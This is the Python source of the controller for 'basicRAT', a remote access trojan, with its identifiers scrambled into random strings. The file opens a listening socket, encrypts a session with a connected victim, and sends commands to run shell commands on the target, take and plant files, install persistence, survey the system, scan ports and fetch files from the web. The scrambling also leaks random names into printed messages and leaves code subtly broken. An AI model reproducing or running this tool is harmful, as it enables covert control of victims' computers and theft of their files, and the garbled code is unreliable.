#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import CkoyYDxmdvqmpDqmiDQfNmYJEooZuJfR,aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu,uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc
    from core.filesock import CJaDqhybJXLaLvKovpVOBoslaLrUFgCi, fwTVfMnsGkhBgXZUJprRUDzBlsiQfVQB
except ImportError as YWGwOkqWBDPrjsjKmKjRtdIblOwMSAAF:
    print YWGwOkqWBDPrjsjKmKjRtdIblOwMSAAF
    sys.exit(0)
fpoXqNOhSRWoXzlfNwfmsTQXwpcyeiZa = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
fPstBtkNLrsmVNqPeOxiVnaQpzerLyiV = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
CDdYFXHTZelLTTEPRhkydlgmGXHeQsAV = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'scan', 'survey', 'unzip', 'upload', 'wget' ]
def IxAGNmkUeWrwPcbusaWhthFnjztZnmOk():
    gTFfKnTsiKohURoFyrnCewGwRBsfrWXM = argparse.ArgumentParser(description='basicRAT server')
    gTFfKnTsiKohURoFyrnCewGwRBsfrWXM.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return gTFfKnTsiKohURoFyrnCewGwRBsfrWXM
def dzIXxNJjKrHldXbZNcDmXhAACACtFDWk():
    gTFfKnTsiKohURoFyrnCewGwRBsfrWXM  = IxAGNmkUeWrwPcbusaWhthFnjztZnmOk()
    cGioHkAdqcrceoJXimMasZjCPNWIhdID    = vars(gTFfKnTsiKohURoFyrnCewGwRBsfrWXM.parse_args())
    RTMBSdXjnyEmpmcRVRddHitocIzwPUUR    = cGioHkAdqcrceoJXimMasZjCPNWIhdID['port']
    WerXeVRoSuIOUzPqeUfRcYEiijTiROFb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.bind(('0.0.0.0', RTMBSdXjnyEmpmcRVRddHitocIzwPUUR))
    except socket.error:
        print 'Error: Unable to start jybzhUMtEcXpeFKNLZgKTPNKIrRsixZu, RTMBSdXjnyEmpmcRVRddHitocIzwPUUR {} in use?'.format(RTMBSdXjnyEmpmcRVRddHitocIzwPUUR)
        sys.exit(1)
    for FyqZARsTodXWyYYCxemSnwzNZUZyQfNZ in fPstBtkNLrsmVNqPeOxiVnaQpzerLyiV.split('\n'):
        time.sleep(0.05)
        print FyqZARsTodXWyYYCxemSnwzNZUZyQfNZ
    print 'basicRAT jybzhUMtEcXpeFKNLZgKTPNKIrRsixZu listening on RTMBSdXjnyEmpmcRVRddHitocIzwPUUR {}...'.format(RTMBSdXjnyEmpmcRVRddHitocIzwPUUR)
    WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.listen(10)
    HfmhtOOvofDObYOITyVEsgfvXrGHjkFx, PMrCKTKaeoKheCLNSDGXOwfvDBaddMYv = WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.accept()
    ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl = uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc(HfmhtOOvofDObYOITyVEsgfvXrGHjkFx, jybzhUMtEcXpeFKNLZgKTPNKIrRsixZu=True)
    while True:
        wkMsTNFVCLVsEHBiYJUEcuZCHElKIJvb = raw_input('\n[{}] basicRAT> '.format(PMrCKTKaeoKheCLNSDGXOwfvDBaddMYv[0])).rstrip()
        if not wkMsTNFVCLVsEHBiYJUEcuZCHElKIJvb:
            continue
        MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud, _, gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy = wkMsTNFVCLVsEHBiYJUEcuZCHElKIJvb.partition(' ')
        if MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud not in CDdYFXHTZelLTTEPRhkydlgmGXHeQsAV:
            print 'Invalid command, type "help" to see qItbZWUsfTFBRLghDxuMCwfxSFENCkvP list of commands.'
            continue
        if MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'help':
            print fpoXqNOhSRWoXzlfNwfmsTQXwpcyeiZa
            continue
        HfmhtOOvofDObYOITyVEsgfvXrGHjkFx.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(wkMsTNFVCLVsEHBiYJUEcuZCHElKIJvb, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
        if MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'quit':
            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.close()
            sys.exit(0)
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'run':
            ulHhNPLgxwxnOclzqKlvxuWLJmQjqOWn = HfmhtOOvofDObYOITyVEsgfvXrGHjkFx.recv(4096)
            print CkoyYDxmdvqmpDqmiDQfNmYJEooZuJfR(ulHhNPLgxwxnOclzqKlvxuWLJmQjqOWn, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl).rstrip()
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'download':
            for eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci in gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy.split():
                eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci = eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci.strip()
                CJaDqhybJXLaLvKovpVOBoslaLrUFgCi(HfmhtOOvofDObYOITyVEsgfvXrGHjkFx, eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'upload':
            for eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci in gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy.split():
                eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci = eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci.strip()
                fwTVfMnsGkhBgXZUJprRUDzBlsiQfVQB(HfmhtOOvofDObYOITyVEsgfvXrGHjkFx, eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'rekey':
            ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl = uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc(HfmhtOOvofDObYOITyVEsgfvXrGHjkFx, jybzhUMtEcXpeFKNLZgKTPNKIrRsixZu=True)
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud)
            ulHhNPLgxwxnOclzqKlvxuWLJmQjqOWn = HfmhtOOvofDObYOITyVEsgfvXrGHjkFx.recv(1024)
            print CkoyYDxmdvqmpDqmiDQfNmYJEooZuJfR(ulHhNPLgxwxnOclzqKlvxuWLJmQjqOWn, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
if __name__ == '__main__':
    dzIXxNJjKrHldXbZNcDmXhAACACtFDWk()
